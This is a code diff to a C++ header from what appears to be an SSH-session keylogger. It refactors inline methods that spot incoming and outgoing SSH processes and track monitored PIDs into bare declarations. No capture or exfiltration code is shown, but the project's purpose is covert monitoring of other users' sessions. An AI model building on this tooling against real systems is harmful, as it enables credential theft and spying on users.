@@ -1,26 +1,15 @@
 #ifndef KEYLOGGER_PROCESS_HPP
 #define KEYLOGGER_PROCESS_HPP
 
-#include "config.hpp"
+#include "parsing.hpp"
 
 class Process{
 public:
     Process(std::string user, uint16_t pid, std::string cmd, std::string args):
             _user(std::move(user)), _pid(pid), _cmd(std::move(cmd)), _args(std::move(args)){};
 
-    bool find_sshd() const {
-        if (_args.find("pts") != std::string::npos){
-            DEBUG_STDOUT("Incoming ssh connection: PID = " + std::to_string(_pid));
-            return true;
-        } else return false;
-    }
-
-    bool find_ssh() const {
-        if (_cmd.find("ssh") != std::string::npos){
-            DEBUG_STDOUT("Outgoing ssh connection: PID = " + std::to_string(_pid));
-            return true;
-        } else return false;
-    }
+    bool find_incoming_ssh() const;
+    bool find_outgoing_ssh() const;
 
     uint16_t get_pid() const {
         return _pid;
@@ -46,12 +35,7 @@ public:
         return instance;
     }
 
-    void del_from_proc_list(uint16_t pid){
-        auto index_to_remove = std::find(std::begin(procs_in_monitoring), std::end(procs_in_monitoring), pid);
-        if(index_to_remove != std::end(procs_in_monitoring)) {
-            procs_in_monitoring.erase(index_to_remove);
-        }
-    }
+    void remove_from_proc_list(uint16_t pid);
 
     std::vector<uint16_t> get_current_proc_list(){
         return procs_in_monitoring;
